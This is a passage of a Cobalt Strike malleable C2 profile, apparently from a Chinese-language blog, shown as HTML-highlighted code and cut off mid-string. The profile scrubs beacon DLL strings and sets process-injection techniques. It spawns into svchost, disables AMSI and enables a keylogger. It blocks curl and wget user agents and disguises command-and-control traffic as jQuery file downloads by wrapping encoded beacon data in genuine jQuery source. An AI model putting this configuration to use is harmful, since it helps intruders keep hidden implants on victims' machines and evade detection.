class="string">&quot;beacon.x64.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;NtQueueApcThread&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsWow64Process&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;HTTP/1.1 200 OK&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;kernel32&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;beacon.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;KERNEL32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;ADVAPI32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WININET.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WS2_32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;DNSAPI.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Secur32.dll&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtectEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualProtect&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAllocEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;VirtualQuery&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RtlVirtualUnwind&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;sAlloc&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsFree&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsGetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlsSetValue&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;InitializeCriticalSectionEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSemaphoreExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadStackGuarantee&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;WaitForThreadpoolTimerCallbacks&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolTimer&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CloseThreadpoolWait&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FlushProcessWriteBuffers&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;FreeLibraryWhenCallbackReturns&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentProcessorNumber&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLogicalProcessorInformation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CreateSymbolicLinkW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;SetDefaultDllDirectories&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;EnumSystemLocalesEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;CompareStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetDateFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLocaleInfoEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetTimeFormatEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserDefaultLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;IsValidLocaleName&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LCMapStringEx&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetCurrentPackageId&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UNICODE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-8&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;UTF-16LE&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MessageBoxW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetActiveWindow&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetLastActivePopup&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetUserObjectInformationW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;GetProcessWindowStation&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Sunday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Monday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Tuesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wednesday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Thursday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Friday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Saturday&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;January&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;February&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;March&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;April&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;June&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;July&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;August&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;September&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;October&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;November&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;December&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;MM/dd/yy&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory around _alloca was corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Runtime Check Error&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Filename&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Unknown Module Name&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Run-Time Check Failure #%d - %s&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack corrupted near unknown variable&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack pointer corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Cast to smaller type causing loss of data&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack memory corruption&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Local variable used before initialization&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Stack around _alloca corrupted&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegOpenKeyExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;egQueryValueExW&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;RegCloseKey&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;LibTomMath&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64DisableWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Wow64RevertWow64FsRedirection&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        strrep <span class="string">&quot;Kerberos&quot;</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        append <span class="string">&quot;\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># stringw <span class="string">&quot;ATTACKTEAMFAMILY&quot;</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 进程注入相关</span><br><span class="line">process-inject &#123;</span><br><span class="line">    <span class="meta"># set remote memory allocation technique</span></span><br><span class="line">    <span class="built_in">set</span> allocator <span class="string">&quot;VirtualAllocEx&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># shape the content and properties of what we will inject</span></span><br><span class="line">    <span class="built_in">set</span> min_alloc <span class="string">&quot;7814&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> userwx    <span class="string">&quot;false&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> startrwx <span class="string">&quot;false&quot;</span>;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>; # NOP, NOP!</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta"># specify how we execute code in the remote process</span></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread <span class="string">&quot;ntdll.dll!RtlUserThreadStart+0x2285&quot;</span>;</span><br><span class="line">        NtQueueApcThread-s;</span><br><span class="line">        SetThreadContext;</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        CreateRemoteThread <span class="string">&quot;kernel32.dll!LoadLibraryA+0x1000&quot;</span>;</span><br><span class="line">        RtlCreateUserThread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">post-ex &#123; </span><br><span class="line">    # 控制后渗透模块特定进程注入过程例如hashdump的具体细节</span><br><span class="line">    <span class="meta"># control the temporary process we spawn to</span></span><br><span class="line">    <span class="built_in">set</span> spawnto_x86 <span class="string">&quot;%windir%\\syswow64\\svchost.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> spawnto_x64 <span class="string">&quot;%windir%\\sysnative\\svchost.exe&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># change the permissions and content of our post-ex DLLs</span></span><br><span class="line">    <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># change our post-ex output named pipe names...</span></span><br><span class="line">    <span class="built_in">set</span> pipename <span class="string">&quot;srvsvc-1-5-5-0####&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># pass key function pointers from Beacon to its child jobs</span></span><br><span class="line">    <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address</span></span><br><span class="line">    <span class="meta"># set thread_hint <span class="string">&quot;module!function+0x##&quot;</span>;</span></span><br><span class="line">    <span class="meta"># disable AMSI in powerpick, execute-assembly, and psinject</span></span><br><span class="line">    <span class="built_in">set</span> amsi_disable <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># control the method used to log keystrokes </span></span><br><span class="line">    <span class="built_in">set</span> keylogger <span class="string">&quot;SetWindowsHookEx&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-config &#123;</span><br><span class="line">    # 增加headers</span><br><span class="line">    </span><br><span class="line">    <span class="meta"># set <span class="string">&quot;true&quot;</span> <span class="keyword">if</span> teamserver is behind redirector</span></span><br><span class="line">    <span class="built_in">set</span> trust_x_forwarded_for <span class="string">&quot;false&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    # 阻止不正常的useragent,如：curl*,lynx*,wget*</span><br><span class="line">    <span class="built_in">set</span> block_useragents <span class="string">&quot;curl*,lynx*,wget*&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.1.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;GET&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="meta">#header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;code.jquery.com&quot;</span>;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            prepend <span class="string">&quot;__cfduid=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;   </span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly <span class="title function_">render</span> <span class="params">(Refer to Tips <span class="keyword">for</span> Profile Parameter Values)</span></span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!<span class="title function_">function</span><span class="params">(e,t)</span>&#123;\<span class="string">&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]&#125;,pushStack:function(e)&#123;var t=w.merge(this.constructor(),e);return t.prevObject=this,t&#125;,each:function(e)&#123;return w.each(this,e)&#125;,map:function(e)&#123;return this.pushStack(w.map(this,function(t,n)&#123;return e.call(t,n,t)&#125;))&#125;,slice:function()&#123;return this.pushStack(o.apply(this,arguments))&#125;,first:function()&#123;return this.eq(0)&#125;,last:function()&#123;return this.eq(-1)&#125;,eq:function(e)&#123;var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])&#125;,end:function()&#123;return this.prevObject||this.constructor()&#125;,push:s,sort:n.sort,splice:n.splice&#125;,w.extend=w.fn.extend=function()&#123;var e,t,n,r,i,o,a=arguments[0]||&#123;&#125;,s=1,u=arguments.length,l=!1;for(\&quot;boolean\&quot;==typeof a&amp;&amp;(l=a,a=arguments[s]||&#123;&#125;,s++),\&quot;object\&quot;==typeof a||g(a)||(a=&#123;&#125;),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:&#123;&#125;,a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a&#125;,w.extend(&#123;expando:\&quot;jQuery\&quot;+(\&quot;3.3.1\&quot;+Math.random()).replace(/\\D/g,\&quot;\&quot;),isReady:!0,error:function(e)&#123;throw new Error(e)&#125;,noop:function()&#123;&#125;,isPlainObject:function(e)&#123;var t,n;return!(!e||\&quot;[object Object]\&quot;!==c.call(e))&amp;&amp;(!(t=i(e))||\&quot;function\&quot;==typeof(n=f.call(t,\&quot;constructor\&quot;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)&#125;,isEmptyObject:function(e)&#123;var t;for(t in e)return!1;return!0&#125;,globalEval:function(e)&#123;m(e)&#125;,each:function(e,t)&#123;var n,r=0;if(C(e))&#123;for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break&#125;else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e&#125;,trim:function(e)&#123;return null==e?\&quot;\&quot;:(e+\&quot;\&quot;).replace(T,\&quot;\&quot;)&#125;,makeArray:function(e,t)&#123;var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&quot;string\&quot;==typeof e?[e]:e):s.call(n,e)),n&#125;,inArray:function(e,t,n)&#123;return null==t?-1:u.call(t,e,n)&#125;,merge:function(e,t)&#123;for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e&#125;,grep:function(e,t,n)&#123;for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i&#125;,map:function(e,t,n)&#123;var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)&#125;,guid:1,support:h&#125;),\&quot;function\&quot;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&quot;Boolean Number String Function Array Date RegExp Object Error Symbol\&quot;.split(\&quot; \&quot;),function(e,t)&#123;l[\&quot;[object \&quot;+t+\&quot;]\&quot;]=t.toLowerCase()&#125;);function C(e)&#123;var t=!!e&amp;&amp;\&quot;length\&quot;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&quot;array\&quot;===n||0===t||\&quot;number\&quot;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)&#125;var E=function(e)&#123;var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&quot;sizzle\&quot;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t)&#123;return e===t&amp;&amp;(f=!0),0&#125;,N=&#123;&#125;.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t)&#123;for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1&#125;,P=\&quot;\r&quot;</span>;</span><br><span class="line">            # <span class="number">1</span>st Line</span><br><span class="line">            prepend <span class="string">&quot;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&quot;</span>;</span><br><span class="line">            append <span class="string">&quot;\&quot;.(o=t.documentElement,Math.max(t.body[\&quot;scroll\&quot;+e],o[\&quot;scroll\&quot;+e],t.body[\&quot;offset\&quot;+e],o[\&quot;offset\&quot;+e],o[\&quot;client\&quot;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)&#125;,t,a?i:void 0,a)&#125;&#125;)&#125;),w.each(\&quot;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&quot;.split(\&quot; \&quot;),function(e,t)&#123;w.fn[t]=function(e,n)&#123;return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)&#125;&#125;),w.fn.extend(&#123;hover:function(e,t)&#123;return this.mouseenter(e).mouseleave(t||e)&#125;&#125;),w.fn.extend(&#123;bind:function(e,t,n)&#123;return this.on(e,null,t,n)&#125;,unbind:function(e,t)&#123;return this.off(e,null,t)&#125;,delegate:function(e,t,n,r)&#123;return this.on(t,e,n,r)&#125;,undelegate:function(e,t,n)&#123;return 1===arguments.length?this.off(e,\&quot;**\&quot;):this.off(t,e||\&quot;**\&quot;,n)&#125;&#125;),w.proxy=function(e,t)&#123;var n,r,i;if(\&quot;string\&quot;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function()&#123;return e.apply(t||this,r.concat(o.call(arguments)))&#125;,i.guid=e.guid=e.guid||w.guid++,i&#125;,w.holdReady=function(e)&#123;e?w.readyWait++:w.ready(!0)&#125;,w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e)&#123;var t=w.type(e);return(\&quot;number\&quot;===t||\&quot;string\&quot;===t)&amp;&amp;!isNaN(e-parseFloat(e))&#125;,\&quot;function\&quot;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&quot;jquery\&quot;,[],function()&#123;return w&#125;);var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t)&#123;return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w&#125;,t||(e.jQuery=e.$=w),w&#125;);&quot;</span>;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    # 主要用于传输任务执行结果的回显</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/jquery-3.3.2.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> verb <span class="string">&quot;POST&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        <span class="meta">#header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;code.jquery.com&quot;</span>;</span></span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;http://code.jquery.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Encoding&quot;</span> <span class="string">&quot;gzip, deflate&quot;</span>;</span><br><span class="line">       </span><br><span class="line">        id &#123;</span><br><span class="line">            mask;       </span><br><span class="line">            base64url;</span><br><span class="line">            parameter <span class="string">&quot;__cfduid&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line">              </span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;NetDNA-cache/2.2&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;max-age=0, no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Pragma&quot;</span> <span class="string">&quot;no-cache&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            mask;</span><br><span class="line">            base64url;</span><br><span class="line">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly <span class="title function_">render</span> <span class="params">(Refer to Tips <span class="keyword">for</span> Profile Parameter Values)</span></span><br><span class="line">            # 2nd Line            </span><br><span class="line">            prepend &quot;!<span class="title function_">function</span><span class="params">(e,t)</span>&#123;\<span class="string">&quot;use strict\&quot;;\&quot;object\&quot;==typeof module&amp;&amp;\&quot;object\&quot;==typeof module.exports?module.exports=e.document?t(e,!0):function(e)&#123;if(!e.document)throw new Error(\&quot;jQuery requires a window with a document\&quot;);return t(e)&#125;:t(e)&#125;(\&quot;undefined\&quot;!=typeof window?window:this,function(e,t)&#123;\&quot;use strict\&quot;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l=&#123;&#125;,c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h=&#123;&#125;,g=function e(t)&#123;return\&quot;function\&quot;==typeof t&amp;&amp;\&quot;number\&quot;!=typeof t.nodeType&#125;,y=function e(t)&#123;return null!=t&amp;&amp;t===t.window&#125;,v=&#123;type:!0,src:!0,noModule:!0&#125;;function m(e,t,n)&#123;var i,o=(t=t||r).createElement(\&quot;script\&quot;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)&#125;function x(e)&#123;return null==e?e+\&quot;\&quot;:\&quot;object\&quot;==typeof e||\&quot;function\&quot;==typeof e?l[c.call(e)]||\&quot;object\&quot;:typeof e&#125;var b=\&quot;3.3.1\&quot;,w=function(e,t)&#123;return new w.fn.init(e,t)&#125;,T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype=&#123;jquery:\&quot;3.3.1\&quot;,constructor:w,length:0,toArray:function()&#123;return o.call(this)&#125;,get:function(e)&#123;return 